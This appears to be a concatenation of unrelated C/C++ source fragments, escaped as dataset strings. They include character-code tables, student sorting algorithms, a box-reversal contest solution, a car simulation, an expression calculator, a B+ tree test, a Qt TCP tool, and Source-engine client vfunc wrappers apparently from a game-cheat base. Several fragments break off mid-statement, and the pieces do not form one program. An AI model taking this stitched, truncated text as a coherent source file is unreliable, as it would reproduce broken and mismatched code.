UTF-16\u3068\u5404\u6587\u5b57\u30b3\u30fc\u30c9\u306e\u5bfe\u5fdc\u8868\u306e\u60c5\u5831\nstruct CHARCODETABLEINFO\n{\n\tu16\t\t\t\t\tMultiByteToUTF16[ 0x10000 ] ;\t\t// \u5404\u6587\u5b57\u30b3\u30fc\u30c9\u304b\u3089UTF-16\u306b\u5909\u63db\u3059\u308b\u305f\u3081\u306e\u30c6\u30fc\u30d6\u30eb\n\tu16\t\t\t\t\tUTF16ToMultiByte[ 0x10000 ] ;\t\t// UTF-16\u304b\u3089\u5404\u6587\u5b57\u30b3\u30fc\u30c9\u306b\u5909\u63db\u3059\u308b\u305f\u3081\u306e\u30c6\u30fc\u30d6\u30eb\n} ;\n\n// \u6a19\u6e96\u95a2\u6570\u306e\u4e92\u63db\u95a2\u6570\u3067\u4f7f\u7528\u3059\u308b\u60c5\u5831\nstruct CHARCODESYSTEM\n{\n\tint\t\t\t\t\tInitializeFlag ;\t\t\t\t\t\t\t// \u521d\u671f\u5316\u51e6\u7406\u3092\u884c\u3063\u305f\u304b\u3069\u3046\u304b( TRUE:\u884c\u3063\u305f  FALSE:\u884c\u3063\u3066\u3044\u306a\u3044 )\n\n\tint\t\t\t\t\tInitializeCharCodeCP932InfoFlag ;\t\t\t// Shift-JIS\u306e\u6587\u5b57\u30b3\u30fc\u30c9\u60c5\u5831\u306e\u521d\u671f\u5316\u51e6\u7406\u3092\u884c\u3063\u305f\u304b\u3069\u3046\u304b( TRUE:\u884c\u3063\u305f  FALSE:\u884c\u3063\u3066\u3044\u306a\u3044 )\n\tCHARCODETABLEINFO\tCharCodeCP932Info ;\t\t\t\t\t\t\t// Shift-JIS\u306e\u6587\u5b57\u30b3\u30fc\u30c9\u60c5\u5831\n\n\tint\t\t\t\t\tInitializeCharCodeCP936InfoFlag ;\t\t\t// GB2312\u306e\u6587\u5b57\u30b3\u30fc\u30c9\u60c5\u5831\u306e\u521d\u671f\u5316\u51e6\u7406\u3092\u884c\u3063\u305f\u304b\u3069\u3046\u304b( TRUE:\u884c\u3063\u305f  FALSE:\u884c\u3063\u3066\u3044\u306a\u3044 )\n\tCHARCODETABLEINFO\tCharCodeCP936Info ;\t\t\t\t\t\t\t// GB2312\u306e\u6587\u5b57\u30b3\u30fc\u30c9\u60c5\u5831\n\n\tint\t\t\t\t\tInitializeCharCodeCP949InfoFlag ;\t\t\t// UHC\u306e\u6587\u5b57\u30b3\u30fc\u30c9\u60c5\u5831\u306e\u521d\u671f\u5316\u51e6\u7406\u3092\u884c\u3063\u305f\u304b\u3069\u3046\u304b( TRUE:\u884c\u3063\u305f  FALSE:\u884c\u3063\u3066\u3044\u306a\u3044 )\n\tCHARCODETABLEINFO\tCharCodeCP949Info ;\t\t\t\t\t\t\t// UHC\u306e\u6587\u5b57\u30b3\u30fc\u30c9\u60c5\u5831\n\n\tint\t\t\t\t\tInitializeCharCodeCP950InfoFlag ;\t\t\t// BIG5\u306e\u6587\u5b57\u30b3\u30fc\u30c9\u60c5\u5831\u306e\u521d\u671f\u5316\u51e6\u7406\u3092\u884c\u3063\u305f\u304b\u3069\u3046\u304b( TRUE:\u884c\u3063\u305f  FALSE:\u884c\u3063\u3066\u3044\u306a\u3044 )\n\tCHARCODETABLEINFO\tCharCodeCP950Info ;\t\t\t\t\t\t\t// BIG5\u306e\u6587\u5b57\u30b3\u30fc\u30c9\u60c5\u5831\n\n\tint\t\t\t\t\tInitializeCharCodeCP1252InfoFlag ;\t\t\t// \u6b27\u6587(\u30e9\u30c6\u30f3\u6587\u5b57\u306e\u6587\u5b57\u30b3\u30fc\u30c9)\u306e\u6587\u5b57\u30b3\u30fc\u30c9\u60c5\u5831\u306e\u521d\u671f\u5316\u51e6\u7406\u3092\u884c\u3063\u305f\u304b\u3069\u3046\u304b( TRUE:\u884c\u3063\u305f  FALSE:\u884c\u3063\u3066\u3044\u306a\u3044 )\n\tCHARCODETABLEINFO\tCharCodeCP1252Info ;\t\t\t\t\t\t// \u6b27\u6587(\u30e9\u30c6\u30f3\u6587\u5b57\u306e\u6587\u5b57\u30b3\u30fc\u30c9)\u306e\u6587\u5b57\u30b3\u30fc\u30c9\u60c5\u5831\n\n\tint\t\t\t\t\tInitializeCharCodeISO_IEC_8859_15InfoFlag ;\t// \u6b27\u6587(\u30e9\u30c6\u30f3\u6587\u5b57\u306e\u6587\u5b57\u30b3\u30fc\u30c9)\u306e\u6587\u5b57\u30b3\u30fc\u30c9\u60c5\u5831\u306e\u521d\u671f\u5316\u51e6\u7406\u3092\u884c\u3063\u305f\u304b\u3069\u3046\u304b( TRUE:\u884c\u3063\u305f  FALSE:\u884c\u3063\u3066\u3044\u306a\u3044 )\n\tCHARCODETABLEINFO\tCharCodeISO_IEC_8859_15Info ;\t\t\t\t// \u6b27\u6587(\u30e9\u30c6\u30f3\u6587\u5b57\u306e\u6587\u5b57\u30b3\u30fc\u30c9)\u306e\u6587\u5b57\u30b3\u30fc\u30c9\u60c5\u5831\n} ;\n\n// data -----------------------------------------\n\nstatic u8 NumberToCharTable[ 2 ][ 16 ] =\n{\n\t{\n\t\t'0', '1', '2', '3', '4', '5', '6', '7',\n\t\t'8', '9', 'a', 'b', 'c', 'd', 'e', 'f',\n\t},\n\n\t{\n\t\t'0', '1', '2', '3', '4', '5', '6', '7',\n\t\t'8', '9', 'A', 'B', 'C', 'D', 'E', 'F',\n\t}\n} ;\n\nstatic u8 FloatErrorStr_QNAN[ 7 ][ 7 ] =\n{\n\t{ '1',   0,   0,   0,   0,   0,   0 },\n\t{ '1', '.',   0,   0,   0,   0,   0 },\n\t{ '1', '.', '$',   0,   0,   0,   0 },\n\t{ '1', '.', '#', 'R',   0,   0,   0 },\n\t{ '1', '.', '#', 'Q', 'O',   0,   0 },\n\t{ '1', '.', '#', 'Q', 'N', 'B',   0 },\n\t{ '1', '.', '#', 'Q', 'N', 'A', 'N' },\n} ;\n\nstatic u8 FloatErrorStr_INF[ 6",
    "#include <bits/stdc++.h>\nusing namespace std;\nstring type=\"\";\nclass student{\nprivate:\n    float GPA;\n    string name;\n    string id;\npublic:\n    student(string name,string id,float GPA){\n          this->GPA=GPA;\n          this->name=name;\n          this->id=id;\n    }\n     string getname(){\n         return this->name;\n     }\n     string  getid(){\n         return this->id;\n     }\n     float getgpa(){\n         return this->GPA;\n     }\n     friend  bool operator>(student s1,student s2);\n};\nbool operator>(student s1, student s2) {\n    if(type==\"GPA\"){\n        return s1.GPA>s2.GPA;\n    }else{\n        return s1.name>s2.name;\n    }\n}\nvoid Writeinfiles(string type,string algname,vector<student>arr){\n    ofstream file;\n    if(type==\"GPA\"){\n        file.open(\"sortedbyGPA.txt\",std::ios_base::app);\n        file<<\"*==*/Algorithm NAME/*==*\"<<\"\\n\";\n        file<<algname<<\"\\n\";\n    }else{\n        file.open(\"sortedbyname.txt\",std::ios_base::app);\n        file<<\"*==*/Algorithm NAME/*==*\"<<\"\\n\";\n        file<<algname<<\"\\n\";\n    }\n    for (auto i:arr) {\n        file<<\"****STUDENT****\"<<\"\\n\";\n        file<<\"Name: \"<<i.getname()<<\"\\n\";\n        file<<\"GPA: \"<<i.getgpa()<<\"\\n\";\n        file<<\"ID: \"<<i.getid()<<\"\\n\";\n    }\n    file.close();\n}\ntemplate<typename T>\nvector<student> sortstudentsByinsertionsort(string tpe,vector<student>arr){\n    type=tpe;\n    int n = arr.size();\n    for (int i = 1; i < n; ++i) {\n        T key = arr[i];\n        int j = i - 1;\n        while (j >= 0 && arr[j] > key) {\n            arr[j + 1] = arr[j];\n            --j;\n        }\n        arr[j+1] = key;\n    }\n    return arr;\n}\nvector<student> selection_sortt(string typ,vector<student>arr){\n    type=typ;\n    int min;\n    for (int i = 0; i <arr.size()-1; ++i) {\n        min=i;\n        for (int j = i; j < arr.size(); ++j) {\n            if(arr[min]>arr[j]){\n                min=j;\n            }\n        }\n        swap(arr[i],arr[min]);\n    }\n    return arr;\n}\nvector<student> shellSort(string typ, vector<student>array) {\n    type=typ;\n    int n=array.size();\n    for (int interval = n / 2; interval > 0; interval /= 2) {\n        for (int i = interval; i < n; i += 1) {\n            student temp = array[i];\n            int j;\n            for (j = i; j >= interval && array[j - interval] > temp; j -= interval) {\n                array[j] = array[j - interval];\n            }\n            array[j] = temp;\n        }\n    }\n    return array;\n}\nvector<student> merge(vector<student> left, vector<student> right) {\n    vector<student> output;\n    int i = 0, j = 0;\n    while (i < left.size() && j < right.size()) {\n        if ( left[i] > right[j] ) {\n            output.push_back(right[j]);\n            j++;\n        } else {\n            output.push_back(left[i]);\n            i++;\n        }\n    }\n    while (i < left.size()) {\n        output.push_back(left[i]);\n        i++;\n    }\n    while (j < right.size()) {\n        output.push_back(right[j]);\n        j++;\n    }\n    return output;\n}\nvector<student> mergeSort(string typ, vector<student> arr) {\n    type=typ;\n    int length = arr.size();\n    if (length == 1) {\n        return arr;\n    }\n    int mid = length / 2;\n    vector<student> left(arr.begin(), arr.begin() + mid);\n    vector<student> right(arr.begin() + mid, arr.end());\n    left = mergeSort(typ,left);\n    right = mergeSort(typ,right);\n    return merge(left, right);\n}\nvoid quick_sort(vector<student>&arr, int left, int right){\n    int i=left, j=right;\n    student pivot=arr[(i+j)/2];\n    while(i<=j){\n        while(pivot>arr[i]){\n            i++;\n        }\n        while(arr[j]>pivot){\n            j--;\n        }\n        if(i<=j){\n            swap(arr[i],arr[j]);\n            i++;\n            j--;\n        }\n\n    }\n    if(left<j){\n        quick_sort(arr,left, j);\n    }\n    if(right>i){\n        quick_sort(arr,i,right);\n    }\n}\nvector<student>quick_H(string typ,vector<student>arr){\n    type=typ;\n    quick_sort(arr,0,arr.size()-1);\n    return arr;\n}\n\nbool flag=true;\nvector<student> SortByBubbleSort(string Type , vector<student>v){\n    type=Type;\n    int n=v.size();\n    for(int i = 0 ; i < n-1 ; i++){\n        for(int j = 0 ;j<n-i-1;j++){\n            if(v[j]>v[j+1]){\n                swap(v[j],v[j+1]);\n                flag=false;\n            }\n        }\n        if(flag){\n            break;\n        }\n    }\n    return v;\n}\n\nvector<string> split(string s, string delimiter) {\n    size_t pos_start = 0, pos_end, delim_len = delimiter.length();\n    string token;\n    vector<string> res;\n    while ((pos_end = s.find(delimiter, pos_start)) != string::npos) {\n        token = s.substr (pos_start, pos_end - pos_start);\n        pos_start = pos_end + delim_len;\n        res.push_back (token);\n    }\n    res.push_back (s.substr (pos_start));\n    return res;\n}\nvoid Readstudents(){\n     vector<student>students;\n     ifstream myfile;\n     myfile.open(\"Students.txt\");\n     string line;\n     getline(myfile,line);\n     cout<<line<<endl;\n     while (!myfile.eof())\n     {\n          getline(myfile,line);\n          if(!line.empt",
    "// Theofanis is busy after his last contest, as now, he has to deliver many halloumis all over the world. \n// He stored them inside n boxes and each of which has some number ai written on it.\n\n// He wants to sort them in non-decreasing order based on their number, however, his machine works in a \n// strange way. It can only reverse any subarray of boxes with length at most k\n\n// Find if it's possible to sort the boxes using any number of reverses.\n\n// Input\n\n// Each test case consists of two lines.\n// The first line of each test case contains two integers n\n//  and k\u2014 the number of boxes and the length of the maximum reverse that Theofanis can make.\n\n// 5\n// 3 2\n// 1 2 3\n// 3 1\n// 9 9 9\n// 4 4\n// 6 4 2 1\n// 4 3\n// 10 3 830 14\n// 2 1\n// 3 1\n\n//Output\n// YES\n// YES\n// YES\n// YES\n// NO\n#include<iostream>\n#include<algorithm>\n#include<vector>\nusing namespace std;\n\nint main(){\n    int t;\n    cin>>t;\n    while(t--){\n        int n; int k;\n        cin>>n>>k;\n        vector<int>arr(n);\n        for(int i=0;i<n;++i){\n            cin>>arr[i];\n        }\n\n        if(k==1 && !is_sorted(arr.begin(),arr.end())){\n            cout<<\"NO\"<<endl;\n        }\n        else{\n            cout<<\"YES\"<<endl;\n        }\n    }\n\n    return 0;\n\n}\n\n",
    "//\n// Created by Riley on 4/25/2024.\n//\n\n#include \"cdll_int.hpp\"\n\n#include \"bitbuf.hpp\" // im scared of what the compiler will say\n\nclient_class* c_hl_client::get_all_classes(void) {\n  return memory::find_vfunc<client_class*(__thiscall*)(void*)>(this, 8u)(this);\n}\n\nvoid c_hl_client::create_move(float sample_time, bool active) {\n  memory::find_vfunc<void(__thiscall*)(void*, float, bool)>(this, 21u)(this, sample_time, active);\n}\n\nbool c_hl_client::write_cmd_to_buffer(bf_write* buf, int from, int to, bool is_new_cmd) {\n  return memory::find_vfunc<bool(__thiscall*)(void*, bf_write*, int from, int to, bool is_new_cmd)>(\n      this, 23u)(this, buf, from, to, is_new_cmd);\n}\n\nvoid c_engine_client::get_screen_size(int& w, int& h) {\n  memory::find_vfunc<void(__thiscall*)(void*, int&, int&)>(this, 5u)(this, w, h);\n}\n\nvoid c_engine_client::client_cmd(const char* input) {\n  return memory::find_vfunc<void(__thiscall*)(void*, const char*)>(this, 12u)(this, input);\n}\n\nvoid c_engine_client::client_cmd_unrestricted(const char* input) {\n  // 100 something i don't know\n  // TODO: this function\n}\n\nint c_engine_client::get_local_player(void) {\n  return memory::find_vfunc<int(__thiscall*)(void*)>(this, 12u)(this);\n}\n\nfloat c_engine_client::plat_float_time(void) {\n  return memory::find_vfunc<float(__thiscall*)(void*)>(this, 14u)(this);\n}\n\nvoid c_engine_client::get_view_angles(QAngle& va) {\n  memory::find_vfunc<void(__thiscall*)(void*, QAngle&)>(this, 19u)(this, va);\n}\n\nvoid c_engine_client::set_view_angles(QAngle& va) {\n  memory::find_vfunc<void(__thiscall*)(void*, QAngle&)>(this, 20u)(this, va);\n}\n\nint c_engine_client::get_max_clients(void) {\n  return memory::find_vfunc<int(__thiscall*)(void*)>(this, 21u)(this);\n}\n\nbool c_engine_client::is_in_game(void) {\n  return memory::find_vfunc<bool(__thiscall*)(void*)>(this, 26u)(this);\n}\n\nbool c_engine_client::is_connected(void) {\n  return memory::find_vfunc<bool(__thiscall*)(void*)>(this, 27u)(this);\n}\n\nconst char* c_engine_client::get_game_directory(void) {\n  return memory::find_vfunc<const char*(__thiscall*)(void*)>(this, 35u)(this);\n}\n\nconst matrix4x4& c_engine_client::world_to_screen_matrix(void) {\n  return memory::find_vfunc<const matrix4x4&(__thiscall*)(void*)>(this, 36u)(this);\n}\n\nbool c_engine_client::get_player_info(int entidx, player_info_t* info) {\n  return memory::find_vfunc<bool(__thiscall*)(void*, int, player_info_t*)>(this, 8u)(this, entidx, info);\n}\n",
    "\ufeff#include <iostream>\n#include <conio.h>\n#include <windows.h>\n#include <thread>\nusing namespace std;\n\n#define MIN_TANK_VOLUME 20\n#define MAX_TANK_VOLUME 150\n#define MIN_ENGINE_CONSUMPTION 3\n#define MAX_ENGINE_CONSUMPTION 30\n#define MAX_SPEED_LOW_LIMIT 120\n#define MAX_SPEED_HIGH_LIMIT 400\n#define Escape 27\n#define Enter 13\n//HW\n#define Up 72 //speed up\n#define Down 80 //slow down\n#define Space 32 //engine on/off\nclass Tank\n{\n\tconst int VOLUME;\n\tdouble fuelLevel;\npublic:\n\tint getVOLUME() const\n\t{\n\t\treturn VOLUME;\n\t}\n\tdouble getFuelLevel() const\n\t{\n\t\treturn fuelLevel;\n\t}\n\tvoid fill(double amount)\n\t{\n\t\tif (amount < 0)\n\t\t{\n\t\t\treturn;\n\t\t}\n\t\tfuelLevel += amount;\n\t\tif (fuelLevel > VOLUME)\n\t\t{\n\t\t\tfuelLevel = VOLUME;\n\t\t}\n\t}\n\tdouble giveFuel(double amount)\n\t{\n\t\tfuelLevel -= amount;\n\t\tif (fuelLevel < 0)\n\t\t{\n\t\t\tfuelLevel = 0;\n\t\t}\n\t\treturn fuelLevel;\n\t}\n\tTank(int volume) :\n\t\tVOLUME\n\t\t(\n\t\t\tvolume < MIN_TANK_VOLUME ? MIN_TANK_VOLUME :\n\t\t\tvolume > MAX_TANK_VOLUME ? MAX_TANK_VOLUME :\n\t\t\tvolume\n\t\t)\n\t{\n\t\tfuelLevel = 0;\n\t\tcout << \"Tank is ready \" << this << endl;\n\t}\n\t~Tank()\n\t{\n\t\tcout << \"Tank is over \" << this << endl;\n\t}\n\tvoid info() const\n\t{\n\t\tcout << \"VOLUME: \" << VOLUME << \" liters\" << endl\n\t\t\t<< \"Fuel level: \" << getFuelLevel() << \" liters\" << endl;\n\t}\n};\nclass Engine\n{\n\tconst double CONSUMPTION;\n\tdouble consumptionPerSecond;\n\tbool isStarted;\n\t\npublic:\n\tdouble getCONSUMPTION() const\n\t{\n\t\treturn CONSUMPTION;\n\t}\n\tdouble getConsumptionPerSecond() const\n\t{\n\t\treturn consumptionPerSecond;\n\t}\n\tvoid setConsumptionPerSecond(int speed)\n\t{\n\t\tif (started())\n\t\t{\n\t\t\tconsumptionPerSecond = CONSUMPTION * 3e-5 + CONSUMPTION * 0.0000283 * speed;//\u042f \u043d\u0435 \u0437\u043d\u0430\u044e, \u043d\u0430\u0441\u043a\u043e\u043b\u044c\u043a\u043e \u0440\u0435\u0430\u043b\u0438\u0441\u0442\u0438\u0447\u043d\u043e \u043f\u043e\u0442\u0440\u0435\u0431\u043b\u0435\u043d\u0438\u0435 \u0442\u043e\u043f\u043b\u0438\u0432\u0430, \u044f \u043f\u0440\u043e\u0441\u0442\u043e \u0442\u044b\u043a\u0430\u043b\u0430 \u0432 \u043a\u0430\u043b\u044c\u043a\u0443\u043b\u044f\u0442\u043e\u0440, \u043f\u043e\u043a\u0430 \u043d\u0435 \u043f\u043e\u043b\u0443\u0447\u0438\u043b\u0430 \u0443\u0441\u0440\u0435\u0434\u043d\u0435\u043d\u043d\u044b\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u0438\u0437 \u0438\u043d\u0442\u0435\u0440\u043d\u0435\u0442\u0430\n\t\t}\n\t\telse\n\t\t{\n\t\t\tconsumptionPerSecond = 0;\n\t\t}\n\t\t\n\t}\n\tvoid start()\n\t{\n\t\tisStarted = true;\n\t\t\n\t}\n\tvoid stop()\n\t{\n\t\tisStarted = false;\n\t}\n\tbool started() const\n\t{\n\t\treturn isStarted;\n\n\t}\n\tvoid info() const\n\t{\n\t\tcout << \"Consumption:\\n:\";\n\t\tcout << CONSUMPTION << \" liters/100km\" << endl;\n\t\tcout << consumptionPerSecond << \" liters/second\" << endl;\n\t}\n\tEngine(double consumption) : CONSUMPTION\n\t(\n\t\tconsumption < MIN_ENGINE_CONSUMPTION ? MIN_ENGINE_CONSUMPTION :\n\t\tconsumption > MAX_ENGINE_CONSUMPTION ? MAX_ENGINE_CONSUMPTION :\n\t\tconsumption\n\t)\n\t{\n\t\tisStarted = false;\n\t\tsetConsumptionPerSecond(0);\n\t\tcout << \"Engine is ready: \" << this << endl;\n\t}\n\t~Engine()\n\t{\n\t\tcout << \"Engine is over: \" << this << endl;\n\t}\n\n};\nclass Car\n{\n\tEngine engine;\n\tTank tank;\n\tint speed;\n\tconst unsigned int MAX_SPEED;\n\tbool driverInside;\n\tstruct\n\t{\n\t\tstd::thread panelThread;\n\t\tstd::thread consumptionThread;\n\t} controlThreads;\npublic:\n\tint getSpeed() const\n\t{\n\t\treturn speed;\n\t}\n\tCar(int maxSpeed, double consumption, int volume) : engine(consumption), tank(volume),\n\t\tMAX_SPEED\n\t\t(\n\t\t\tmaxSpeed < MAX_SPEED_LOW_LIMIT ? MAX_SPEED_LOW_LIMIT :\n\t\t\tmaxSpeed > MAX_SPEED_HIGH_LIMIT ? MAX_SPEED_HIGH_LIMIT :\n\t\t\tmaxSpeed\n\t\t)\n\t{\n\t\tspeed = 0;\n\t\tdriverInside = false;\n\t\tcout << \"Your car is ready: \" << this << endl;\n\t\tcout << \"Press Enter to get in: \" << endl;\n\t}\n\t~Car()\n\t{\n\t\tcout << \"Car is over\" << this << endl;\n\t}\n\tvoid info() const\n\t{\n\t\tengine.info();\n\t\ttank.info();\n\t\tcout << \"max speed: \" << MAX_SPEED << \" km/h\" << endl;\n\t}\n\tvoid getIn()\n\t{\n\t\tdriverInside = true;\n\t\tcontrolThreads.panelThread = std::thread(&Car::panel, this);\n\t}\n\tvoid getOut()\n\t{\n\t\tdriverInside = false;\n\t\tif (controlThreads.panelThread.joinable())\n\t\t{\n\t\t\tcontrolThreads.panelThread.join();\n\t\t}\n\t\tsystem(\"cls\");\n\t\tcout << \"\u0412\u044b \u0432\u044b\u0448\u043b\u0438 \u0438\u0437 \u043c\u0430\u0448\u0438\u043d\u044b\" << endl;\n\t}\n\tvoid panel() const\n\t{\n\t\twhile (driverInside)\n\t\t{\n\t\t\tsystem(\"cls\");\n\t\t\tcout << \"Speed: \" << speed << \" km/h\\n\";\n\t\t\tcout << \"Engine is: \" << (engine.started() ? \"started \" : \"stopped \") << endl;\n\t\t\tcout << \"Fuel level: \" << tank.getFuelLevel() << \" liters\" << endl;\n\t\t\tcout << \"Consumption: \" << engine.getConsumptionPerSecond() << \" liters/second\" << endl;\n\t\t\tSleep(1000);\n\t\t}\n\n\t}\n\tvoid spendFuel()\n\t{\n\t\twhile (engine.started())\n\t\t{\n\t\t\ttank.giveFuel(engine.getConsumptionPerSecond());\n\t\t\tSleep(1000);\n\t\t}\n\t}\n\tvoid control()\n\t{\n\t\tchar key;\n\t\tdo\n\t\t{\n\t\t\tkey = _getch();\n\t\t\tswitch (key)\n\t\t\t{\n\t\t\tcase Enter: \n\t\t\t\tif (driverInside and !speed) getOut();\n\t\t\t\telse if (!driverInside and !speed) getIn();\n\t\t\t\tbreak;\n\t\t\tcase Escape:\n\t\t\t\tstopEngine();//\u0427\u0442\u043e\u0431\u044b \u0437\u0430\u0434\u0436\u043e\u0439\u043d\u0438\u0442\u044c \u043f\u043e\u0442\u043e\u043a \u043f\u043e\u0442\u0440\u0435\u0431\u043b\u0435\u043d\u0438\u044f \u0442\u043e\u043f\u043b\u0438\u0432\u0430\n\t\t\t\tgetOut();\n\t\t\t\tbreak;\n\t\t\t//HW\n\t\t\tcase Up:\n\t\t\t\tif (driverInside and engine.started())\n\t\t\t\t{\n\t\t\t\t\tspeedUp();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase Down:\n\t\t\t\tif (driverInside and engine.started())\n\t\t\t\t{\n\t\t\t\t\tslowDown();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase Space:\n\t\t\t\tif (engine.started() and !speed) stopEngine();\n\t\t\t\telse if (!engine.started() and !speed) startEngine();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\n\t\t} while (key != Escape);\n\t}\n\tvoid startEngine()//HW\n\t{\n\t\tengine.start();\n\t\tengine.setConsumptionPerSecond(0);\n\t\tcout << \"\u0414\u0432\u0438\u0433\u0430\u0442\u0435\u043b\u044c \u0437\u0430\u043f\u0443\u0449\u0435\u043d\\n\";\n\t\tcontrolThreads.consumptionThread = std::thread(&Car::spendFuel, this);\n\n\t}\n\tvoid stopEngine()//HW\n\t{\n\t\tengine.stop();\n\t\t",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nclass Solution {\r\npublic:\r\n    int calculate(string& s) {\r\n        long long int sum = 0;\r\n        int sign = 1;\r\n        stack<pair<int,int>> st;\r\n\r\n        for(int i=0; i<s.size();i++){\r\n            if(isdigit(s[i])){\r\n                long long int num = 0;\r\n                while(i<s.size() && isdigit(s[i])){\r\n                    num = num * 10 + (s[i] - '0');\r\n                    i++;\r\n                }\r\n                i--;\r\n                sum += num * sign;\r\n                sign = 1;\r\n            }\r\n            else if(s[i] == '('){\r\n                st.push({sum, sign});\r\n                sum = 0;\r\n                sign = 1;\r\n            }\r\n            else if(s[i] == ')'){\r\n                sum = st.top().first + (st.top().second * sum);\r\n                st.pop();\r\n\r\n            }\r\n            else if(s[i] == '-'){\r\n                sign = -1 * sign;\r\n            }\r\n        }\r\n        return sum;\r\n    }\r\n};\r\n\r\nint main(){\r\n    \r\n    Solution s;\r\n    string st;\r\n\r\n    getline(cin,st);\r\n    cout<<s.calculate(st)<<endl;\r\n\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include <iostream>\n#include \"../include/file_io.hpp\"\n#include \"../include/util.hpp\"\n#include \"../include/bpt.hpp\"\n#include <ctime>\nusing std::cin, std::cout, std::endl;\nusing sjtu::string, sjtu::qsort, sjtu::b_plus_tree;\n\nb_plus_tree bpt;\n\nvoid print() {\n    std::cout << \"tree start----------------------------------------------------------------------------------------------------------------\\n\";\n    bpt.print();\n    std::cout << \"tree end----------------------------------------------------------------------------------------------------------------\\n\";\n}\n\nint main() {\n    // fstream file;\n    // file.open(\"totoo.txt\", std::ios::in | std::ios::out);\n    // assert(file.is_open());\n    // cout << \"at first \" << file.tellp() << endl;\n    // file << 'a';\n    // cout << file.tellp();\n    // file.close();\n\n    const int N = 50000;\n\n    time_t time1 = time(NULL);\n    {\n        sjtu::string str = \"zzzzz\";\n        for (int i = N; i >= 1; i--) {\n            bpt.insert(str, i);\n            --str;\n            // cout << \"inserted \" << N - i + 1 << endl;\n        }\n    }\n    cout << \"ALL INSERTED\" << endl;\n    assert(bpt.size() == N);\n\n    time_t time2 = time(NULL);\n    // int a;\n    // cin >> a;\n    // print();\n    // bpt.find(\"xzzzzzz\");\n    // bpt.erase(\"xzzzzzzzzzzzzzzzzzzzzzzzzz\", N);\n    // bpt.erase(\"zzzzzzzzzzzzzzzzzzzzzzzzzz\", N);\n    // print();\n    // todo : solve same elements\n    {\n        int successcnt = 0;\n        sjtu::string str = \"zzzzz\";\n        for (int i = N; i >= 1; i--, --str) {\n            // if (i == 41) {\n            //                     print();\n            // }\n            if (bpt.erase(str, i)) {\n                // int sz = bpt.size();\n                successcnt++;\n                // cout << \"successfully erased \";\n                // str.print();\n                // cout << endl;\n                // print();\n                // cout << \"erased \" << N - i + 1 << endl;\n                // if (sz != i - 1) {\n                //     cout << i - 1 << \" bpt: \" << sz << endl;\n                //     exit(0);\n                // }\n            } else {\n                cout << \"could not erase \";\n                str.print();\n                cout << endl;\n                cout << i << endl;\n                print();\n                exit(0);\n            }\n        }\n        cout << \"succeeded \" << successcnt << endl;\n    }\n    time_t time3 = time(NULL);\n    cout << \"insertion \" << time2 - time1 << endl;\n    cout << \"deletion \" << time3 - time2 << endl;\n    return 0;\n}",
    "#include \"BaseConversion.h\"\n#include \"BaseConversionServer.h\"\n#include \"BaseConversionClient.h\"\n#include <QPushButton>\n#include <QDateTime>\n#include <QTcpSocket>\n\nQString byteArray2Bin(QByteArray data);\nQString byteArray2Dec(QByteArray data);\nQString byteArray2Hex(QByteArray data);\nQString hex2QString(QByteArray data);\n\nBaseConversion::BaseConversion(QWidget *parent)\n    : QWidget(parent)\n{\n    ui.setupUi(this);\n    //ui.splitter->setSizes(QList<int>({ (int)(width() * 0.2) ,(int)(width() * 80) }));\n    setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Expanding);\n    setLayout(ui.horizontalLayout);\n    ui.ServerWidget->setLayout(ui.gridLayoutServer);\n    ui.ClientWidget->setLayout(ui.gridLayoutClient);\n\n    // \u521b\u5efa\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u5339\u914dIP\u5730\u5740\n    QRegExp ipAddressRegExp(\"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$\");\n    // \u521b\u5efa\u8f93\u5165\u9a8c\u8bc1\u5668\n    QRegExpValidator* validator = new QRegExpValidator(ipAddressRegExp, this);\n    // \u521b\u5efa\u4e00\u4e2a\u6574\u6570\u9a8c\u8bc1\u5668\uff0c\u9650\u5236\u8303\u56f4\u5728 0 \u5230 65535 \u4e4b\u95f4\n    QIntValidator* portValidator = new QIntValidator(0, 65535, this);\n    // \u5c06\u9a8c\u8bc1\u5668\u8bbe\u7f6e\u5230QLineEdit\u4e0a\n    ui.lineEditServerPort->setValidator(portValidator);\n    ui.lineEditClientIP->setValidator(validator);\n    ui.lineEditClientPort->setValidator(portValidator);\n\n    ui.lineEditServerPort->setText(\"8000\");\n    ui.lineEditClientIP->setText(\"127.0.0.1\");\n    ui.lineEditClientPort->setText(\"8000\");\n\n    server = new BaseConversionServer();\n    client = new BaseConversionClient();\n    \n    // server->listen(QHostAddress::Any, 8000);\n    // client->connectToServer(\"127.0.0.1\", 8080);\n\n    // \u5f00\u542f\u670d\u52a1\u6309\u94ae\n    connect(ui.pushButtonOpen, &QPushButton::clicked, this, [&]() {\n        static int serverCnt = 1;\n        QString date = QDateTime::currentDateTime().toString(\"yyyy-MM-dd hh:mm:ss.zzz\");\n        if (serverCnt % 2) {\n            // \u5f00\u59cb\u76d1\u542c\n            server->listen(QHostAddress::Any, ui.lineEditServerPort->text().toInt());\n            if (server->isListening()) {\n                ui.pushButtonOpen->setText(tr(\"Close\"));\n                message = QString(tr(\"[%1]# Open server surrces. port: %2\\n\")).arg(date).arg(ui.lineEditServerPort->text().toInt());\n                serverCnt++;\n            }else{\n                message = QString(tr(\"[%1]# Open server failed. port:%2\\n\")).arg(date).arg(ui.lineEditServerPort->text().toInt());\n            }\n            ui.plainTextEditDataLogServer->appendPlainText(message);\n        }\n        else {\n            server->close();\n            if (!server->isListening()) {\n                ui.pushButtonOpen->setText(tr(\"Open\"));\n                message = QString(tr(\"[%1]# Close server surrces\\n\")).arg(date);\n                serverCnt++;\n            }\n            else {\n                message = QString(tr(\"[%1]# Close server failed\\n\")).arg(date);\n            }\n            ui.plainTextEditDataLogServer->appendPlainText(message);\n        }\n        });\n    // \u8fde\u63a5\u6309\u94ae\n    connect(ui.pushButtonConnect, &QPushButton::clicked, this, [&]() {\n        static int clientCnt = 1;\n        QString date = QDateTime::currentDateTime().toString(\"yyyy-MM-dd hh:mm:ss.zzz\");\n        if (clientCnt % 2) {\n            // \u8fde\u63a5\u670d\u52a1\u5668\n            